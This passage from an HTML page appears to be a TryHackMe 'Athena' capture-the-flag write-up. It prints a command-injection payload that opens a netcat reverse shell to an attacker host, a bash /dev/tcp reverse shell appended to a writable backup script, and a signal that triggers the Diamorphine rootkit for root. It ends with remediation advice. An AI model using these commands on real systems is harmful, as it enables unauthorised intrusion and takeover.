+<h3 id="establishing-a-reverse-shell" class="relative group">Establishing a Reverse Shell <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#establishing-a-reverse-shell" aria-label="Anchor">#</a></span></h3><p>With confirmed command injection, a reverse shell was initiated using <strong>netcat</strong>.</p>
+<pre tabindex="0"><code>curl http://&lt;target-ip&gt;/myrouterpanel/ping.php -X POST -d &#39;ip=%0a  nc -c /bin/sh &lt;attacker-ip&gt; 4444 &amp;submit=&#39;
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_dc50a5080ed700cf.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_a85a54fcd9b863ae.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_b1eaf861427640b6.webp 940w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_b1eaf861427640b6.webp 940w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="940"
+        height="66"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_f22eafca9e9115a7.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_db3b8d6b21535da6.png 330w,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell_hu_f22eafca9e9115a7.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell.png 940w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/reverse-shell.png 940w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="shell-stabilization" class="relative group">Shell Stabilization <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shell-stabilization" aria-label="Anchor">#</a></span></h3><p>The initial shell was unstable. The following steps were used to stabilize it:</p>
+<pre tabindex="0"><code>python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
+</code></pre><pre tabindex="0"><code>export TERM=xterm
+</code></pre><p>Press <strong>Ctrl+Z</strong>, then run:</p>
+<pre tabindex="0"><code>stty raw -echo; fg
+</code></pre><pre tabindex="0"><code>stty rows 38 columns 116
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/athena-tryhackme/shell-access_hu_d0bbb73f85d09dc4.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="425"
+        height="152"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/shell-access.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-internal-enumeration" class="relative group">Step 3: Internal Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-internal-enumeration" aria-label="Anchor">#</a></span></h2><h3 id="user-enumeration" class="relative group">User Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#user-enumeration" aria-label="Anchor">#</a></span></h3><p>With a stable shell as <code>www-data</code>, user enumeration was performed to identify potential targets for lateral movement.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/athena-tryhackme/user-enum_hu_54d9fc0f35c36a51.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="451"
+        height="143"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/user-enum.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h3 id="discovering-the-backup-script" class="relative group">Discovering the Backup Script <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#discovering-the-backup-script" aria-label="Anchor">#</a></span></h3><p>Searching for writable files and scripts with special permissions revealed a backup script:</p>
+<pre tabindex="0"><code>find / -type f -perm -u=s
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="https://k40tik.github.io/posts/athena-tryhackme/find-perm-output_hu_8e31e840fb7a0b39.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="474"
+        height="139"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/find-perm-output.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The script <code>/usr/share/backup/backup.sh</code> was found to be owned by <code>www-data</code> but had execute permissions for the user <code>athena</code>. The script&rsquo;s contents showed it was responsible for backing up files from athena&rsquo;s home directory.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_738cc4f966cb6bc9.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_6d35d3d671b92959.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_e7db31eb51b8a1a5.webp 686w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_e7db31eb51b8a1a5.webp 686w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="686"
+        height="49"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_99bb47a0683a6774.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_7fd879c1add26e28.png 330w,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_99bb47a0683a6774.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/backup-script.png 686w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/backup-script.png 686w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_738cc4f966cb6bc9.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_6d35d3d671b92959.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_e7db31eb51b8a1a5.webp 686w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_e7db31eb51b8a1a5.webp 686w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="686"
+        height="49"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_99bb47a0683a6774.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_7fd879c1add26e28.png 330w,https://k40tik.github.io/posts/athena-tryhackme/backup-script_hu_99bb47a0683a6774.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/backup-script.png 686w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/backup-script.png 686w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-4-lateral-movement" class="relative group">Step 4: Lateral Movement <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-lateral-movement" aria-label="Anchor">#</a></span></h2><p>Since <code>www-data</code> had write access to <code>backup.sh</code> and <code>athena</code> had execute permissions on it, the script was modified to include a reverse shell payload:</p>
+<pre tabindex="0"><code>echo &#39;bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1&#39; &gt;&gt; backup.sh
+</code></pre><p>When the script was executed (either manually or via a cron job), a reverse shell was received as the <code>athena</code> user.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_97def9091a73f824.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_5a54ff229ccc7c5.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_415a66ab1de4c676.webp 745w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_415a66ab1de4c676.webp 745w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="745"
+        height="181"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_79944a4495126fdc.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_39322eaf8ad5bb9d.png 330w,https://k40tik.github.io/posts/athena-tryhackme/athena-access_hu_79944a4495126fdc.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/athena-access.png 745w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/athena-access.png 745w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-5-privilege-escalation" class="relative group">Step 5: Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-5-privilege-escalation" aria-label="Anchor">#</a></span></h2><h3 id="analyzing-the-kernel-module" class="relative group">Analyzing the Kernel Module <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analyzing-the-kernel-module" aria-label="Anchor">#</a></span></h3><p>With access as <code>athena</code>, a suspicious kernel module was identified. Analyzing the binary in <strong>Ghidra</strong> revealed a <code>diamorphine_init</code> label — indicating the presence of the <strong>Diamorphine</strong> rootkit.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_cad26b99fb14e37e.webp 330w,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_e6fa6f4cc49fa4d7.webp 660w
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_bc341b67bf0418ec.webp 880w
+              
+            
+            
+              
+                ,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_bc341b67bf0418ec.webp 880w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="880"
+        height="512"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_a6d7ca2d029f5ca0.png" srcset="https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_6dfaffeaa2e7bba7.png 330w,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine_hu_a6d7ca2d029f5ca0.png 660w
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine.png 880w
+          
+          
+            ,https://k40tik.github.io/posts/athena-tryhackme/ghidra-diamorphine.png 880w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Within the decompiled code, a critical check was found:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">iVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">param_1</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">iVar3</span> <span class="o">==</span> <span class="mh">0x39</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">give_root</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__x86_return_thunk</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The value <code>0x39</code> (decimal 57) acts as a trigger. When the rootkit receives signal 57, it calls the <code>give_root()</code> function, elevating the current process to root.</p>
+<h3 id="triggering-the-rootkit" class="relative group">Triggering the Rootkit <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#triggering-the-rootkit" aria-label="Anchor">#</a></span></h3><p>The rootkit was activated by sending the specific signal:</p>
+<pre tabindex="0"><code>kill -57 0
+</code></pre><pre tabindex="0"><code>athena@routerpanel:/$ id
+uid=0(root) gid=0(root) groups=0(root),1001(athena)
+</code></pre><pre tabindex="0"><code>root@routerpanel:/# whoami
+root
+</code></pre><h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This box demonstrated a full compromise from enumeration to root through the following attack chain:</p>
+<ol>
+<li><strong>SMB anonymous access</strong> leaked a file containing a hidden web endpoint.</li>
+<li><strong>Command injection</strong> on the ping utility provided initial code execution as <code>www-data</code>.</li>
+<li><strong>Abusing a writable backup script</strong> allowed lateral movement to the <code>athena</code> user.</li>
+<li><strong>Triggering the Diamorphine rootkit</strong> via a signal-based backdoor achieved root access.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Disable SMB anonymous access</strong> to prevent unauthorized file sharing access.</li>
+<li><strong>Sanitize all user inputs</strong> on web applications to prevent command injection vulnerabilities.</li>
+<li><strong>Audit file permissions</strong> regularly and ensure scripts are not writable by lower-privileged users.</li>
+<li><strong>Monitor for kernel rootkits</strong> using tools like <code>rkhunter</code> or <code>chkrootkit</code> and verify kernel module integrity.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="https://k40tik.github.io/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,https://k40tik.github.io/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          
+          
+            ,https://k40tik.github.io/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="https://k40tik.github.io/posts/support-htb/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Support — HackTheBox</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-07-03 16:09:13 &#43;0000 &#43;0000">3 July 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="https://k40tik.github.io/posts/ascension-hacksmarter/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Ascension — HackSmarter</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-07 09:08:04 &#43;0300 EAT">7 August 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
